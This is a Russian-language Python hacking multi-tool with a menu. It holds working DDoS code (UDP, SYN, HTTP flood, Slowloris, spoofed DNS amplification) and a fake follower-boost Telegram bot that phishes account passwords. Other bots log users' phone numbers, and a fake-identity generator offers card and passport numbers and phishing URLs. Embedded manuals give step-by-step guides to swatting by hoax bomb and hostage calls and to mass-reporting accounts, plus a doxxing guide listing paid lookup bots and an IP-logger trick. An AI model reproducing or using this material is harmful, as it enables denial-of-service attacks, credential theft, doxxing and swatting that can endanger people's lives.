###ВЕРСИЯ СОЗДАТЕЛЯ!
import random
import phonenumbers
import string
import requests
import os
import threading
import time
import logging
import whois
import socket
from scapy.all import *
from phonenumbers import carrier, geocoder, timezone, NumberParseException

# Цвета для терминала
COLORS = {
    "1": '\033[31m',  # Красный
    "2": '\033[32m',  # Зеленый
    "3": '\033[34m',  # Темно-синий
    "4": '\033[37m',  # Белый
}

RESET = '\033[0m'
current_color = COLORS["3"]  # По умолчанию темно-синий

import webbrowser



import telebot
from telebot import types

# Список для хранения проверенных пользователей
verified_users = {}









import logging
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    CallbackContext,
    ContextTypes,
    filters,
)

# Логирование
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ====== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ======
def save_to_file(filename, content):
    """Сохраняет текстовые данные в файл."""
    with open(filename, "a", encoding="utf-8") as file:
        file.write(content + "\n")

# ====== БОТ: АНОНИМНЫЙ ЧАТ ======
verified_users = {}

async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    if user_id in verified_users:
        await update.message.reply_text("Вы уже подтвердили личность. Используйте команду /anon_chat.")
    else:
        keyboard = [[KeyboardButton("Отправить контакт", request_contact=True)]]
        reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
        await update.message.reply_text(
            "Пожалуйста, подтвердите свою личность, отправив свой контакт.", reply_markup=reply_markup
        )


async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    contact = update.message.contact.phone_number
    verified_users[user_id] = contact

    # Сохраняем контакт в файл
    save_to_file("contacts.txt", f"User ID: {user_id}, Contact: {contact}")

    await update.message.reply_text("Спасибо! Теперь вы можете использовать анонимный чат.")

async def start_anon_chat(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "Добро пожаловать в анонимный чат! Отправьте сообщение, и его увидят другие пользователи."
    )

async def handle_anon_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    message_text = update.message.text
    if user_id in verified_users:
        for uid in verified_users:
            if uid != user_id:
                await context.bot.send_message(chat_id=uid, text=f"Аноним: {message_text}")

        # Сохраняем сообщение в файл
        save_to_file("anon_messages.txt", f"User ID: {user_id}, Message: {message_text}")
    else:
        await update.message.reply_text("Пожалуйста, подтвердите свою личность с помощью команды /start.")



def start_anonymous_chat():
    print(colored_text("Запуск бота: Анонимный чат"))
    token = input(colored_text("Введите токен вашего бота: "))
    application = Application.builder().token(token).build()

    application.add_handler(CommandHandler("start", start_handler))
    application.add_handler(CommandHandler("anon_chat", start_anon_chat))
    application.add_handler(MessageHandler(filters.CONTACT, contact_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_anon_message))

    print(colored_text("Бот 'Анонимный чат' запущен. Нажмите Ctrl+C для остановки."))
    application.run_polling()

# ====== БОТ: ФЕЙК НАКРУТКА ======
# ====== БОТ: ФЕЙК НАКРУТКА ======
ASK_CREDENTIALS = range(1)

def save_to_file(filename, data):
    """Функция для записи данных в файл"""
    with open(filename, "a", encoding="utf-8") as file:
        file.write(data + "\n")

async def nakrutka_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("""
Привет, я бот для накрутки! 
Могу накрутить до 5000 подписчиков, 10000 лайков и 50000 просмотров.
Чтобы начать накрутку, введите логин и пароль через пробел:
(создатель лично будет вам накручивать все)
""")
    return ASK_CREDENTIALS

async def save_credentials(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.message.from_user.id
    credentials = update.message.text
    project_name = context.bot_data.get("project_name", "unknown_project")

    # Сохраняем данные в файл
    save_to_file(f"{project_name}_credentials.txt", f"User ID: {user_id}, Credentials: {credentials}")
    await update.message.reply_text("Ваши данные сохранены. Накрутка запущена!")
    return ConversationHandler.END

async def fake_handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    message_text = update.message.text

    # Сохраняем только текстовые сообщения в файл
    save_to_file("nakrutka_messages.txt", f"User ID: {user_id}, Message: {message_text}")
    await update.message.reply_text("Накрутка начнётся через 2 часа и будет длиться около 2 дней.")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("Команда отменена.")
    return ConversationHandler.END

def start_fake_nakrutka():
    print(colored_text("Запуск бота: Фейк накрутка"))
    token = input(colored_text("Введите токен вашего бота: "))
    project_name = input(colored_text("Введите название проекта (например, YouTube, TikTok): "))

    application = Application.builder().token(token).build()
    application.bot_data["project_name"] = project_name

    nakrutka_handler = ConversationHandler(
        entry_points=[CommandHandler("nakrutka", nakrutka_start)],
        states={ASK_CREDENTIALS: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_credentials)]},
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    application.add_handler(nakrutka_handler)
    application.add_handler(CommandHandler("start", nakrutka_start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, fake_handle_message))

    print(colored_text("Бот 'Фейк накрутка' запущен. Нажмите Ctrl+C для остановки."))
    application.run_polling()

# ====== ОСНОВНОЕ МЕНЮ ======
def start_bot():
    print(colored_text("Выберите бота для запуска:"))
    print(colored_text("1. Анонимный чат"))
    print(colored_text("2. Фейк накрутка"))
    choice = input(colored_text("Введите номер (1 или 2): "))
    if choice == '1':
        start_anonymous_chat()
    elif choice == '2':
        start_fake_nakrutka()
    else:
        print(colored_text("Некорректный ввод. Попробуйте снова."))
        start_bot()








import random
import string
import faker

# Создаем Faker объект для одного языка (русского)
fake = faker.Faker('ru_RU')

# Функция для генерации фейковых данных кредитной карты
def generate_card_data():
    card_number = ''.join([str(random.randint(0, 9)) for _ in range(16)])
    card_expiry = f'{random.randint(1, 12):02d}/{random.randint(23, 29)}'
    cvv = random.randint(100, 999)
    print(f"Карта: {card_number}\nСрок действия: {card_expiry}\nCVV: {cvv}")

# Функция для генерации фейковых IP-адресов
def generate_ip():
    ip = ".".join([str(random.randint(0, 255)) for _ in range(4)])
    print(f"IP: {ip}")

# Функция для генерации фейкового MAC-адреса
def generate_mac():
    mac = ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
    print(f"MAC: {mac}")

# Функция для генерации сложного пароля
def generate_password(length):
    chars = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(chars) for _ in range(length))
    print(f"Пароль: {password}")

# Функция для генерации данных личности
def generate_personal_data():
    name = fake.name()
    address = fake.address()
    phone = fake.phone_number()
    print(f"Имя: {name}\nАдрес: {address}\nТелефон: {phone}")

# Функция для генерации даты рождения
def generate_birthdate():
    birthdate = fake.date_of_birth(minimum_age=18, maximum_age=90)
    print(f"Дата рождения: {birthdate}")

# Функция для генерации паспортных данных
def generate_passport():
    passport_number = ''.join([random.choice(string.ascii_uppercase) for _ in range(2)]) + \
                      ''.join([str(random.randint(0, 9)) for _ in range(7)])
    print(f"Паспорт: {passport_number}")

# Функция для генерации координат (широта, долгота)
def generate_coordinates():
    lat = round(random.uniform(-90, 90), 6)
    lon = round(random.uniform(-180, 180), 6)
    print(f"Координаты: {lat}, {lon}")

# Функция для генерации фальшивой новости
def generate_fake_news():
    headline = fake.sentence(nb_words=6)
    try:
        nb_sentences = int(input("Введите количество предложений для новости: "))
        story = fake.paragraph(nb_sentences=nb_sentences)
        print(f"Заголовок: {headline}\nНовость: {story}")
    except ValueError:
        print("Ошибка: введите корректное числовое значение.")

# Функция для генерации водительского удостоверения
def generate_driving_license():
    license_number = ''.join([random.choice(string.ascii_uppercase) for _ in range(2)]) + \
                     ''.join([str(random.randint(0, 9)) for _ in range(6)])
    print(f"Водительское удостоверение: {license_number}")

# Функция для генерации адреса электронной почты
def generate_email():
    email = fake.email()
    print(f"Электронная почта: {email}")

# Функция для генерации телефонного номера
def generate_phone_number():
    phone_number = fake.phone_number()
    print(f"Телефонный номер: {phone_number}")

# Функция для генерации серийного номера устройства
def generate_serial_number():
    serial_number = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    print(f"Серийный номер устройства: {serial_number}")

# Функция для генерации имени компании
def generate_company_name():
    company_name = fake.company()
    print(f"Название компании: {company_name}")

# Функция для генерации банковского счета
def generate_bank_account():
    account_number = ''.join([random.choice(string.digits) for _ in range(20)])
    print(f"Банковский счет: {account_number}")

# Функция для генерации локального IP-адреса (например, 192.168.x.x)
def generate_local_ip():
    local_ip = f"192.168.{random.randint(0, 255)}.{random.randint(1, 255)}"
    print(f"Локальный IP: {local_ip}")

# Функция для генерации URL для фишинга
def generate_phishing_url():
    fake_domain = ''.join(random.choices(string.ascii_lowercase, k=10)) + ".com"
    print(f"Фишинговый URL: http://{fake_domain}")

# Функция для генерации фальшивого заказа
def generate_fake_order():
    product = fake.word()
    price = random.randint(100, 10000)
    print(f"Товар: {product}\nЦена: {price} руб.")

# Функция для генерации поддельных данных соцсетей
def generate_fake_social_profile():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    followers = random.randint(1000, 100000)
    print(f"Профиль: @{username}\nПодписчиков: {followers}")

# Функция для генерации фейкового чека оплаты
def generate_fake_payment_receipt():
    amount = random.randint(100, 10000)
    receipt_number = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    print(f"Сумма: {amount} руб.\nЧек: {receipt_number}")

# Функция для генерации кода для обхода аутентификации
def generate_auth_bypass_code():
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    print(f"Код обхода аутентификации: {code}")

# Функция для генерации фальшивого квитанции о доставке
def generate_fake_delivery_receipt():
    delivery_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    print(f"Квитанция о доставке: {delivery_id}")

# Функция для генерации поддельного налогового счета
def generate_fake_tax_bill():
    tax_bill = random.randint(1000, 100000)
    tax_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    print(f"Налоговый счет: {tax_bill} руб.\nИНН: {tax_id}")

# Функция для генерации фальшивого банковского перевода
def generate_fake_bank_transfer():
    transfer_amount = random.randint(1000, 100000)
    transfer_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    print(f"Банковский перевод: {transfer_amount} руб.\nID перевода: {transfer_id}")

# Функция для генерации поддельной истории браузера
def generate_fake_browser_history():
    websites = [fake.url() for _ in range(5)]
    print("История браузера:")
    for website in websites:
        print(website)

# Главное меню
def menu_generator():
    while True:
        print(colored_text("""\n

  _____  ____   __   _____ ______ _   _ ______ _____  
 |  __ \/_ \ \ / /  / ____|  ____| \ | |  ____|  __ \ 
 | |  | || |\ V /  | |  __| |__  |  \| | |__  | |__) |
 | |  | || | > <   | | |_ |  __| | . ` |  __| |  _  / 
 | |__| || |/ . \  | |__| | |____| |\  | |____| | \ \ 
 |_____/ |_/_/ \_\  \_____|______|_| \_|______|_|  \_\
 by Krytoi1czel                              
_______________________________________________________________________________________________
|1. Сгенерировать данные карты		     |14. Сгенерировать название компании             |
|2. Сгенерировать IP-адрес		     |15. Сгенерировать банковский счет               |
|3. Сгенерировать MAC-адрес                  |16. Сгенерировать локальный IP                  |
|4. Сгенерировать сложный пароль             |17. Сгенерировать фишинговый URL                |
|5. Сгенерировать данные личности            |18. Сгенерировать фальшивый заказ               |
|6. Сгенерировать дату рождения              |19. Сгенерировать фейковый профиль в соцсетях   |
|7. Сгенерировать паспортные данные          |20. Сгенерировать фейковый чек оплаты           |
|8. Сгенерировать координаты                 |21. Сгенерировать код обхода аутентификации     |
|9. Сгенерировать фальшивую новость          |22. Сгенерировать фальшивую квитанцию о доставке|
|10. Сгенерировать водительское удостоверение|23. Сгенерировать поддельный налоговый счет     |
|11. Сгенерировать email		     |24. Сгенерировать фальшивый банковский перевод  |
|12. Сгенерировать телефонный номер          |25. Сгенерировать поддельную историю браузера   |
|13. Сгенерировать серийный номер устройства |0. Выход					      |
|____________________________________________|________________________________________________|"""))



        choice = input(colored_text("Выберите действие: "))
        if choice == "1":
            generate_card_data()
        elif choice == "2":
            generate_ip()
        elif choice == "3":
            generate_mac()
        elif choice == "4":
            length = int(input(colored_text("Введите длину пароля: ")))
            generate_password(length)
        elif choice == "5":
            generate_personal_data()
        elif choice == "6":
            generate_birthdate()
        elif choice == "7":
            generate_passport()
        elif choice == "8":
            generate_coordinates()
        elif choice == "9":
            generate_fake_news()
        elif choice == "10":
            generate_driving_license()
        elif choice == "11":
            generate_email()
        elif choice == "12":
            generate_phone_number()
        elif choice == "13":
            generate_serial_number()
        elif choice == "14":
            generate_company_name()
        elif choice == "15":
            generate_bank_account()
        elif choice == "16":
            generate_local_ip()
        elif choice == "17":
            generate_phishing_url()
        elif choice == "18":
            generate_fake_order()
        elif choice == "19":
            generate_fake_social_profile()
        elif choice == "20":
            generate_fake_payment_receipt()
        elif choice == "21":
            generate_auth_bypass_code()
        elif choice == "22":
            generate_fake_delivery_receipt()
        elif choice == "23":
            generate_fake_tax_bill()
        elif choice == "24":
            generate_fake_bank_transfer()
        elif choice == "25":
            generate_fake_browser_history()
        elif choice == "0":
            break
        else:
            print(colored_text("Некорректный ввод. Попробуйте снова."))









def udp_flood(target_ip, target_port=80):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024)
    while True:
        sock.sendto(bytes_to_send, (target_ip, target_port))
        print(colored_text(f"Пакет отправлен на {target_ip}:{target_port}"))

def syn_flood(target_ip, target_port=80):
    while True:
        ip = IP(dst=target_ip)
        tcp = TCP(dport=target_port, flags="S")
        packet = ip / tcp
        send(packet, verbose=False)
        print(colored_text(f"Отправлен SYN-пакет на {target_ip}:{target_port}"))

def http_flood(target_url):
    while True:
        try:
            response = requests.get(target_url)
            print(colored_text(f"Отправлен запрос: {response.status_code}"))
        except Exception as e:
            print(f"Ошибка: {e}")

def slowloris(target_ip, target_port=80):
    sockets = []
    for i in range(100):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.send(b"GET / HTTP/1.1\r\n")
        sockets.append(s)
    while True:
        for s in sockets:
            try:
                s.send(b"X-a: keep-alive\r\n")
            except socket.error:
                sockets.remove(s)
        print("Отправлены медленные запросы")
        time.sleep(10)

def dns_amplification(dns_server, target_ip):
    while True:
        ip = IP(src=target_ip, dst=dns_server)
        udp = UDP(sport=12345, dport=53)
        dns = DNS(rd=1, qd=DNSQR(qname="example.com"))
        packet = ip / udp / dns
        send(packet, verbose=False)
        print(colored_text("DNS-запрос отправлен"))

def ddos_attack():
    print(colored_text("\nВыберите тип DDoS атаки:"))
    print(colored_text("1. UDP Flood"))
    print(colored_text("2. SYN Flood"))
    print(colored_text("3. HTTP Flood"))
    print(colored_text("4. Slowloris"))
    print(colored_text("5. DNS Amplification"))

    attack_choice = input(colored_text("Введите номер атаки: "))

    if attack_choice == "1":
        target_ip = input(colored_text("Введите IP-адрес цели: "))
        target_port = input(colored_text("Введите порт цели (по умолчанию 80): "))
        target_port = int(target_port) if target_port else 80
        print(colored_text("Запуск UDP Flood атаки..."))
        udp_flood(target_ip, target_port)
    elif attack_choice == "2":
        target_ip = input(colored_text("Введите IP-адрес цели: "))
        target_port = input(colored_text("Введите порт цели (по умолчанию 80): "))
        target_port = int(target_port) if target_port else 80
        print(colored_text("Запуск SYN Flood атаки..."))
        syn_flood(target_ip, target_port)
    elif attack_choice == "3":
        target_url = input(colored_text("Введите URL цели: "))
        print(colored_text("Запуск HTTP Flood атаки..."))
        http_flood(target_url)
    elif attack_choice == "4":
        target_ip = input(colored_text("Введите IP-адрес цели: "))
        target_port = input(colored_text("Введите порт цели (по умолчанию 80): "))
        target_port = int(target_port) if target_port else 80
        print(colored_text("Запуск Slowloris атаки..."))
        slowloris(target_ip, target_port)
    elif attack_choice == "5":
        dns_server = input(colored_text("Введите IP DNS-сервера: "))
        target_ip = input(colored_text("Введите IP-адрес цели: "))
        print(colored_text("Запуск DNS Amplification атаки..."))
        dns_amplification(dns_server, target_ip)
    else:
        print(colored_text("Неверный выбор, попробуйте снова."))





#___________________________________________________________________________________________________________________________________________________________
# Функция для логирования и сохранения информации о пользователе
def log_user_info(message):
    user_id = message.chat.id
    username = message.from_user.username if message.from_user.username else "Не указан"
    phone_number = verified_users.get(user_id, "Не подтверждено")

    user_info = (f"ID в Telegram: {user_id}\n"
                 f"Username: {username}\n"
                 f"Номер телефона: {phone_number}\n"
                 f"-----------------------------\n")

    try:
        with open('users_log.txt', 'r', encoding='utf-8') as file:
            file_content = file.read()
            if user_info in file_content:
                print(colored_text(f"Данные пользователя с ID {user_id} уже записаны, пропускаем запись."))
                return
    except FileNotFoundError:
        pass

    with open('users_log.txt', 'a', encoding='utf-8') as file:
        file.write(user_info)
        print(colored_text(f"Данные пользователя с ID {user_id} были сохранены в файл."))

# Обработчик команды /start
def start_handler(message):
    if message.chat.id in verified_users:
        bot.send_message(message.chat.id, f"Приветствую {message.from_user.first_name}, это анонимный чат!")
    else:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton(text='Подтвердить что вы не робот', callback_data='verify'))
        bot.send_message(message.chat.id, f"Приветствую {message.from_user.first_name}, это анонимный чат. Подтвердите личность.", reply_markup=markup)

# Обработчик подтверждения личности
def verify_handler(call):
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    button_contact = types.KeyboardButton(text="Отправить контакт", request_contact=True)
    markup.add(button_contact)
    bot.send_message(call.message.chat.id, "Пожалуйста, подтвердите свою личность, отправив свой контакт.", reply_markup=markup)

# Обработчик контактной информации
def contact_handler(message):
    user_id = message.chat.id

    if user_id in verified_users:
        bot.send_message(message.chat.id, "Вы уже подтвердили свою личность.")
    else:
        verified_users[user_id] = message.contact.phone_number
        log_user_info(message)
        bot.send_message(message.chat.id, "Спасибо за подтверждение. Теперь вы можете использовать функционал бота. Введите команду /anon_chat чтоб найти собеседника")

# Функция анонимного чата (пример базовой реализации)
def start_anon_chat(message):
    bot.send_message(
        message.chat.id,
        "Анонимный чат активирован! Отправьте любое сообщение, и его увидят все участники чата."
    )

# Пример обработки текстовых сообщений
def handle_text(message):
    if message.chat.id in verified_users:
        # Рассылаем сообщение всем пользователям
        for user_id in verified_users:
            if user_id != message.chat.id:  # Исключаем отправителя
                bot.send_message(user_id, f"Сообщение от анонимного пользователя: {message.text}")
    else:
        bot.send_message(message.chat.id, "Пожалуйста, подтвердите личность перед использованием анонимного чата.")

# Функция запуска бота (17)
def start_bot1():
    global bot
    token_bot = input(colored_text("Введите токен вашего бота: "))
    try:
        bot = telebot.TeleBot(token_bot)

        # Привязка обработчиков
        bot.message_handler(commands=['start'])(start_handler)
        bot.callback_query_handler(func=lambda call: call.data == 'verify')(verify_handler)
        bot.message_handler(content_types=['contact'])(contact_handler)
        bot.message_handler(commands=['anon_chat'])(start_anon_chat)
        bot.message_handler(content_types=['text'])(handle_text)

        print("Бот запущен. Нажмите Ctrl+C для остановки.")
        bot.polling()
    except Exception as e:
        print(f"Ошибка при запуске бота: {e}")

#_____________________________________________________________________________________________________________________


def popi():
    url = "https://t.me/D1XPEHOD"

    if os.name == 'posix':
        # Termux (Linux)
        os.system(f'termux-open-url "{url}"')
    else:
        # Windows
        webbrowser.open(url)


            


def banword():
    char_map = {
    'а': ['а', '@', '4', 'A', '∂'],
    'б': ['б', '6', 'Ъ', 'b', 'ß'],
    'в': ['в', '8', 'B', 'β', '|3'],
    'г': ['г', 'r', 'Г', 'Γ', 'г'],
    'д': ['д', 'D', '∆', '|)', '∂'],
    'е': ['е', '3', '€', 'E', '∈'],
    'ё': ['ё', 'e', 'Ё', 'ë', 'є'],
    'ж': ['ж', '×', 'Ж', '>|<', '*'],
    'з': ['з', '3', 'Z', 'Ʒ', 'z'],
    'и': ['и', 'u', 'И', 'и', '|/'],
    'й': ['й', 'u~', 'Й', 'и~', 'i̇'],
    'к': ['к', 'k', '|<', '|{', 'κ'],
    'л': ['л', 'л', 'J1', '/\\', '∧'],
    'м': ['м', 'M', '^^', '|V|', 'м'],
    'н': ['н', 'H', '#', '|-|', 'н'],
    'о': ['о', '0', 'O', 'ο', '○'],
    'п': ['п', 'n', 'П', '|Π', 'n'],
    'р': ['р', 'p', 'P', 'ρ', 'ʀ'],
    'с': ['с', 'c', 'C', 'ς', '©'],
    'т': ['т', 'T', '+', 'τ', '†'],
    'у': ['у', 'y', 'Y', 'v', 'ү'],
    'ф': ['ф', 'F', 'Ф', 'φ', 'ф'],
    'х': ['х', 'x', 'X', '×', 'χ'],
    'ц': ['ц', 'u,', 'Ц', 'Ц', 'ц'],
    'ч': ['ч', '4', 'Ч', 'ч', 'Ч'],
    'ш': ['ш', 'W', 'Ш', 'щ', 'ш'],
    'щ': ['щ', 'W~', 'Щ', 'щ', 'щ'],
    'ь': ['ь', '`', 'Ь', "'", 'ь'],
    'ы': ['ы', 'bi', 'Ы', 'bı', 'ы'],
    'ъ': ['ъ', 'Ъ', 'b~', "'", 'ъ'],
    'э': ['э', '3', 'Э', 'ε', 'э'],
    'ю': ['ю', 'Ю', 'Uo', 'Ю', 'ю'],
    'я': ['я', '9', 'R', '9', 'я']
}


    word = input(colored_text("Введите слово для искажения: "))
    result = ''.join(random.choice(char_map.get(char.lower(), [char])) for char in word)
    print(colored_text(f"Искажённое слово: {result}"))
    wait_for_input()


def manuals_menu():
    """Меню для выбора и просмотра мануалов."""
    manuals = {
        '1': "Снос акаунта телеграм",
        '2': "Сват",
        '3': "Докс",
        '4': "Анонимность",
        '5': "Угон username в телеграмм",
        '6': "Как вести переговоры с сватером, доксером, тролем(для дефера)",
        '7': "Выход в главное меню"
    }
    manual_texts = {
     '1': """Снос акаунта телеграмм:

Что нужно:
- много почт (рабочих) либо сносер
- доказательства 
- айди человека и юзернейм
- ссылка на сообщение
- нужно написать на официальные почты телеграма -> sms@telegram.org, dmca@telegram.org, abuse@telegram.org, support@telegram.org
 						
Провоцируем жертву на угрозы, оски, буллинг и тд. Дальше пишем на почты перечисленые выше. В письме указывем скриншоты булинга, угроз и тд.
"Здраствуйте, хочу подать жалобу на (юзер и айди типа).  уважением, пользователь" и все, главное скриншоты - доказательства\n""",
    
     '2': """Сват

МЕТОД ПЕРВЫЙ ОКРУЖНОЙ ПОЛИЦЕЙСКИЙ 

1.Получите адрес дома ваших жертв.
2.Когда вы найдете адрес вашей цели ищите не чрезвычайную ситуацию для их округа или города.
3.Как скрыть свою личность при совершении звонка вы можете использовать textnow
('(textnow работает только для Канады, США и Пуэрто-Рико)
, firertc').
И другие приложения (при использовании обязательно находиться в VPN или общественной сети Wi-Fi).
4.При выполнении вызова измените свой голос, сделав это самостоятельно или с помощью голосового чейнджера.
5.как генерировать большой отклик при вызове заложников и бомб, как правило, работают, но делают 
это убедительно



МЕТОД ВТОРОЙ МЕТОД ФБР:
1.Получите адрес дома ваших жертв
2.когда вы найдите адрес, купите аккаунт skype в интернет плейсах с балансом. 
3.при звонке обязательно используйте VPN Mullvad, и так же общественную сеть точки Wi-Fi
4.при выполнении вызова измените свой голос, сделав это самостоятельно или с помощью голосового чейнджера.
5. при звонке назовите не настоящий ваши данные, не бойтесь, не смейтесь во время звонка. 
что-то вроде этого может сработать.
Количество ФБР 1 202-324-3000



ТЕКСТОВОЙ МЕТОД

1. купите на интернет плейсах почту gmail, обязательно при входе на нее используйте VPN (Mullvad pro)
2. скачиваем tor browser, регистрируемся, ищем сайт gmail.
3. входите в купленную почту
4. напишите письмо, обходя БАН ворды (заmuнuровано, с’me’рть) 
5. найдите почты на которые полетят письма.
5. отправляете письмо
6. готово

рекомендую искать почты городских СМИ, и объектов которые подвергнуться атаки. не используйте почты по типу fsb@fsb.ru, csnsput@fsb.ru, mvd@mvd.ru.

при регистрации любых сервисов, используй виртуальные номера, ОБЯЗАТЕЛЬНО делай покупки с выключенным VPN, старайся как меньше сдавать свой трафик на сайты.

Mullvad VPN (5€/month): https://mullvad.net/ru/

настройка тор - https://www.youtube.com/watch?v=mVwBCPXwtoY


бан ворды:
смерть, взрыв, теракт, террористы, бомба, террористическая группировка

объединение linux - https://www.youtube.com/watch?v=Yp8PtHpgyb0

""",
     '3': """ Докс

(Деанон - это когда кто-то раскрывает твою настоящую личность или информацию о тебе в Интернете, что позволяет другим людям узнать, кто ты на самом деле.)

(Доксинг - это когда кто-то собирает и раскрывает твою личную информацию в Интернете, например, твое имя, адрес, номер телефона и т.д. с целью нападения на тебя или публичного осуждения.)

(Мануал - это документ, который содержит инструкции или руководство по выполнению каких-либо задач. Он может быть написан на разных языках и иметь различный вид, от простых листов бумаги до объемных книг или электронных файлов. Мануалы помогают людям понимать, как правильно использовать какое-либо устройство или выполнять определенные задачи, уменьшая возможность ошибок и улучшая качество работы.)


----------------------------------------------------


НАЧИНАЕМ

@o12yuzom3_bot_bot
Дефолт,глаз бога. Бот как вы знаете пробивает по многим данным,имеет огромное количество баз данных,но проктически все его покупают из за телеграма,так как там пиздец ваще тема,они даже платили 2₽ за одного контакта,ну кнч же у них база будет ебейшая,400₽ месяц.


@Qu11ck_osi111nt_bot
Квик осинт, пиздатый для меня бот,подписка стоит +- 600-650₽ на месяц,но для меня стоит. Пробивает так же по телеграм аккаунту не плохо,бывает что выдает очень много информации за раз,так что советую.

@Angel_SearchBot

Архангел. Ахуенный бот прям,к сожалению тут запросы,на месяц и тд тут нету. Но все равно ахуенный бот для пробивов,если даже чуть дорогой.

@Zernerda_bot

Зернерда. Тоже пиздатый бот, использую его повседневно, выдает не плохо так информации,и подписка дешевая. Советую для начинающих.

@TheAlexUsersBox_bot

Юзербокс. Ахуенный просто бот,я его обожаю просто, выдает пиздец топовую инофрмацию,иногда бывает то что выдает ту где нигде нету. Пиздец огромный функционал. Подписка не дорогая.

@TheAlexGta_bot

Гта бот. Не плохой бой для пробивов,даже сказал бы очень даже очень хороший бот. Имеет ахуенный функционал,огромное количество баз данных,и многок другое.

@VKHistoryRobot

Вкхистори. Ахуенный бот для чека истории аккаунта,чекает как выглядел аккаунт 1-10 лет назад,ваще кайфово. Можно найти старые фотографии и т.д.


@GetOK2bot (Одноклассники, находит профиль по номеру)

@poiskorcombot(Пиздатый бот тоже по многим данным пробивакт ваще имба)

@cybersecdata_bot(Полностью бесплатный бот ахуенный тоже но чуть запутано но поху,иногда может не работать а так кайфово)

@bmi_np_bot(определяет оператор и ищет ещё че либо. такое се но пойдет)

@ip_score_checker_bot (Чекер IP / думаю лучший бот)

@UsersSearchBot (один из лучших пиздато пробивает первый кто зайдет тип который впервые нажмет старт получит 7 д подписку бесплатную)

@safe_search_bot (дата лик не плохой бот тоже пробивает ахуенно,но с подпиской пиздато ещё,но и без подписки не плохо так инофрмации выдает скажу я вам)

@SovaAppBot (бля ребзя не могу описать бота пиздатый бот много чего находит чекните сами пж один из лучших ботов)

@PhoneLeaks_bot (тоже ахуенный чекает в каких утечках был найден номер)

@Detecta_bot (ебать пиздатый соц сети ахуенно находит и другие данные ваще шик)

@search_himera_bot (пиздец какой дорогой но шикарный)

@TeleSkan_bot (топовый смотрит в каких группах был найден телеграм аккаунт)

@helper_inform_bot (БЛЯ ЕБЕЙШИЙ находит ахуенную инфу прям все шикарно расписывает и все шик)

@BlackatSearchBot (топовый тоже не плохо так пробивает по различным данным не плохо так показывает 90% баланс симкарты и тд многок другое кайф крч)

@test_sys_tank_bot (дорогой нахуй но пиздатый бля скажу честно пизда)

@FakeSMI_bot (крч кидаешь боту ссылку делает фейк ссылку и кидает те,после того кидаешь долбаебу он заходит и его айпишник у тебя и пробиваешь через айпи логгер и все авхенно,но хуй точный адрес найдешьдх тк с айпи невозможно)

@eyeofbeholder_bot (сами чекнете потом пиздатый просто бот мне лень описывать че тут)

@pyth1a_0racle_bot (БЛЯЯЯ ЕБЕЙШИЙ БОТ ищет историю там покупок и тд в яндексе ваще кайфовый даже иногда выдает геолокацию)

@TgAnalyst_bot (пиздатый просто выдает номер по тегу ахуенный,но не вселда выдает не забывайте)

@getcontact_real_bot (обыч гетконтакт не плохой)

@UniversalSearchRobot (бля ахуенный бот но платный а так ебейший функционал бля просто имба тупа)

@telesint_bot (тож не плохой просто ищет группы по тегу кайф)

@ce_poshuk_bot (ахуенный бот просто для украины вообще пиздатый ну там и так в основном украина)

@infobazaa_bot (бля пашет давно ахуенный просто бот бля всем пиздец как советую но платный но зато пиздатый)

ребят ща дам дополнительную инфу и факты


сразу скажу факт что деф не всегда помогает но иногда решает то что у кого ты покупал его

бля пж не ведитесь на долбаебов которые нихуя о вас не знают и скажут что сватнут вас просто пошлите их нахуй и киньте в чс они вам репу портить будут

денег нету на покупки что либо - к сожалению не многого добьешься братанчик

всегда будь уверенным в себе даже если ты сватнут там не парься так и так все пройдёт даже уже всем похуц на сват но есть которые попадаются как долбаебы которые через свою основную почту сватают АЭАЭАЭАЭАЭАХАХАХААХАХХАХАХАХАХАХАЗАЗАЗАЗА

так же скажу последствия свата что твои гаджеты менты будут проверять в течении 3 месяца каждую ределю будешь идти как долбаеб и гаджеты на проверку тупо сдавать лучше не заниматься хуйней

постарайтесь максимально не злоупотреблять этим пж последствия возможео плохие будут

покупайте не виртуальные а физические номерв их дохуище в продаже помогает не плохо так тк они пустыми бывают

лучше полностью чекайте себя во всех базах постарайтесь максимально быть анонимным чтобы пизды не получить

не пишите мне в лс " с чего начать " и тд просто начинайте подбирать для ся пиздатых ботов и все ищите че угодно,но вам бабки понадобятся братишки

так же тут вам скину разные сервисы и разные боты для пробивов

